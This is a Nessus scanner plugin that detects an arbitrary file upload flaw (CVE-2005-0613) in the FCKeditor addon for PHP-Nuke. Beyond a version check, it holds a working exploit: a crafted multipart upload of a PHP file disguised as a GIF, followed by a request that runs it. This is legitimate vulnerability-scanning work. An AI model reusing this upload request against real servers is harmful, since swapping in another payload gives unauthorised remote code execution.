#
# (C) Tenable Network Security
#


desc["english"] = "
Synopsis :

The remote web server contains a PHP application that suffers from an
arbitrary code execution issue. 

Description :

The remote host is running a version of the FCKeditor addon for
PHP-Nuke that allows a remote attacker to upload arbitrary files and
run them in the context of the web server user. 

Solution : 

Upgrade to FCKeditor version 2.0 RC3 or later.

Risk factor : 

High / CVSS Base Score : 7 
(AV:R/AC:L/Au:NR/C:P/A:P/I:P/B:N)";


if (description) {
  script_id(17239);
  script_version("$Revision: 1.9 $");

  script_cve_id("CVE-2005-0613");
  script_bugtraq_id(12676);

  name["english"] = "FCKeditor for PHP-Nuke Arbitrary File Upload Vulnerability";
  script_name(english:name["english"]);
 
  script_description(english:desc["english"]);
 
  summary["english"] = "Detects arbitrary file upload vulnerability in FCKeditor for PHP-Nuke";
  script_summary(english:summary["english"]);
 
  script_category(ACT_MIXED_ATTACK);
  script_copyright(english:"This script is Copyright (C) 2005-2006 Tenable Network Security");

  family["english"] = "CGI abuses";
  script_family(english:family["english"]);

  script_dependencies("php_nuke_installed.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


install = get_kb_item("www/" + port + "/php-nuke");
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
  dir = matches[2];

  if (safe_checks()) {
    req = http_get(item:dir + "/modules.php?name=FCKeditor", port:port);
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
    if (res == NULL) exit(0);

    # according to _docs/whatsnew.html in the source, an Image button was
    # added in version 1.6.0 so it's probably safe to treat everything
    # from that through 2.0 RC2 as vulnerable.
    if (egrep(pattern:"<br>FCKeditor (1\.6|2\.0 (BETA|RC1|RC2)) ", string:res)) {
      report = string(
        desc["english"],
        "\n\n",
        "Plugin output :\n",
        "\n",
        "Nessus has determined the vulnerability exists on the target\n",
        "simply by looking at the version number of FCKeditor\n",
        "installed there.\n"
      );
      security_hole(port:port, data:report);
      exit(0);
    }
  }  
  else {
    # Try to exploit it.
    fname = "nessus-plugin.gif.php";
    boundary = "nessus";
    req = string(
      "POST ",  dir, "/modules/FCKeditor/editor/filemanager/browser/default/connectors/php/connector.php?Command=FileUpload&Type=Image&CurrentFolder=/ HTTP/1.1\r\n",
      "Host: ", get_host_name(), "\r\n",
      "User-Agent: ", get_kb_item("global_settings/http_user_agent"), "\r\n",
      "Content-Type: multipart/form-data; boundary=", boundary, "\r\n"
      # nb: we'll add the Content-Length header and post data later.
    );
    boundary = string("--", boundary);
    postdata = string(
      boundary, "\r\n", 
      'Content-Disposition: form-data; name="Newfile"; filename="', fname, '"', "\r\n",
      "Content-Type: image/gif\r\n",
      "\r\n",
      # NB: This is the actual exploit code; you could put pretty much
      #     anything you want here.
      "<? phpinfo() ?>\r\n",
  
      boundary, "--", "\r\n"
    );
    req = string(
      req,
      "Content-Length: ", strlen(postdata), "\r\n",
      "\r\n",
      postdata
    );
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
    if (res == NULL) exit(0);

    # Now retrieve the "image" we just uploaded.
    #
    # nb: ServerPath defaults to "/modules/FCKeditor/upload" 
    #     in FCKeditor w/ PHP-Nuke.
    serverpath = "/modules/FCKeditor/upload";
    url = string(dir, serverpath, "/Image/", fname);
    req = http_get(item:url, port:port);
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
    if (res == NULL) exit(0);

    # If we could run it, there's a problem.
    if ("PHP Version" >< res) {
      report = string(
        desc["english"],
        "\n\n",
        "Plugin output :\n",
        "\n",
        "Nessus has successfully exploited this vulnerability by uploading\n",
        "an image file with PHP code that reveals information about the\n",
        "PHP configuration on the remote host. The file is located under\n",
        "the web server's document directory as:\n",
        "  ", url, "\n",
        "You are strongly encouraged to delete this file as soon as\n",
        "possible as it can be run by anyone who accesses it remotely.\n"
      );
      security_hole(port:port, data:report);
      exit(0);
    }
  }
}
